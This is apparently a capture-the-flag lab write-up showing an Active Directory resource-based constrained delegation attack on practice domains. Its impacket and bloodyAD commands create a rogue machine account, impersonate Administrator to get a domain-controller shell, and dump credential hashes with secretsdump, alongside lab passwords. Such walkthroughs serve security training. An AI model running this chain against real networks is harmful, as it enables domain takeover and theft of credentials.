RBCD - `Resource-based Constrained Delegation` attack after modifying the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the `K2ROOTDC` with our rights

---

### **1. Create your attacker computer in AD**

```ruby
/usr/share/doc/python3-impacket/examples/addcomputer.py -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 10.10.228.45 -domain-netbios K2 'K2.thm/o.armstrong:arMStronG08'
```
	

- Creates `ATTACKERSYSTEM$` in AD using `o.armstrong` credentials.
- Uses **SAMR method** for account creation.

---

### **2. Delegate the computer account to the target (RBCD)**

```ruby
/usr/share/doc/python3-impacket/examples/rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'K2ROOTDC$' -action 'write' 'K2.thm/o.armstrong:arMStronG08'
```

- Modifies the `ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity` attribute on `K2ROOTDC$`.
- Now `ATTACKERSYSTEM$` can request TGS for any user.


---

### **3. Request a TGS for Domain Admin**

```ruby
/usr/share/doc/python3-impacket/examples/getST.py -spn 'cifs/K2ROOTDC.K2.THM' -impersonate 'Administrator' 'K2.thm/attackersystem$:Summer2018!'
```

- Requests a Kerberos ticket **impersonating Administrator**.
- Output is a `.ccache` ticket file.

---

### **4. Set the ticket for usage**

```ruby
export KRB5CCNAME=Administrator@cifs_K2ROOTDC.K2.THM@K2.THM.ccache
```


- Points your Kerberos client to the newly obtained TGS.

---

### **5. Use the ticket to get a shell**

```ruby
/usr/share/doc/python3-impacket/examples/wmiexec.py k2.thm/Administrator@K2ROOTDC.k2.thm -k -no-pass
```

- Pass-the-ticket (PTT) login as **Administrator**.
- Fully elevated shell on the DC.

---

This chain completely bypasses password cracking, leverages your GenericWrite → IT Director → RBCD path, and gives **Domain Admin access**.



# Alternative method for kerberos

Add FS01$ to DelegatedAdmins

```
bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312'  add groupMember DelegatedAdmins 'fs01$'
```

- `add groupMember DelegatedAdmins fs01$` = “Add FS01$ as a member of the DelegatedAdmins group.”

Result:

> `fs01$ added to DelegatedAdmins`

Now FS01$ is inside the group that has RBCD rights over DC01. So **FS01$ can use RBCD against DC01**.

Now call a TGT for 'FS01$' user :

```
impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' 'vintage.htb/fs01$:fs01' -dc-ip 10.129.231.205
```

result :

```
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

Now using this ticket along with Secretsdump we can perform hash dump

```
KRB5CCNAME='dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache' impacket-secretsdump -k DC01.vintage.htb 
```


